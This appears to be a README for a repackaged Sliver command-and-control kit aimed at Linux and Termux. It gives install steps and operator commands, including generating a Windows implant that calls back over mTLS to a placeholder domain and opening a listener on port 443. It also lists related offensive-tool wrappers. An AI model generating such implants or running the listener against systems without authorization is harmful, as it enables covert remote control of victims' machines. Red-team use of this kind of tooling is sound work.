# Paradox Alloy

Cross-platform C2 framework (Sliver) with strong implant generation and operator UX.

Paradox operator kit — terminal & Termux focused.

**Upstream:** [BishopFox/sliver](https://github.com/BishopFox/sliver)

---

## Files in this repo

| File | Purpose |
|------|---------|
| `install-linux.sh` | Linux installer (tries official script, falls back to go install) |
| `install-termux.sh` | Termux installer |
| `start-server.sh` | Launch sliver-server |
| `start-client.sh` | Launch sliver client |
| `README.md` | This file |

---

## Quick Start

### Linux

```bash
git clone https://github.com/Paradoxdreamer/paradox-alloy.git
cd paradox-alloy
chmod +x *.sh
./install-linux.sh
```

Then:

```bash
./start-server.sh          # terminal 1
./start-client.sh          # terminal 2
```

### Termux

```bash
git clone https://github.com/Paradoxdreamer/paradox-alloy.git
cd paradox-alloy
chmod +x install-termux.sh start-server.sh start-client.sh
./install-termux.sh
source ~/.bashrc
./start-server.sh
```

---

## Common Operator Commands

```bash
# Generate implant
generate --mtls your.domain.com --os windows --arch amd64 --save .

# Start mTLS listener
mtls --lhost 0.0.0.0 --lport 443

# Other profiles: http, https, wg, dns
```

---

## Notes

- Works very well on Termux for the server side
- Client is also usable on Termux
- Prefer official `sliver.sh/install` on full Linux when possible

Use only with proper authorization.

---

## Paradox Collection

- Paradox Sovereign → Havoc
- **Paradox Alloy** → Spiver (this)
- Paradox Oracle → BloodHound
- Paradox Phantom → Evilginx
- Paradox Packet → Impacket
- + more
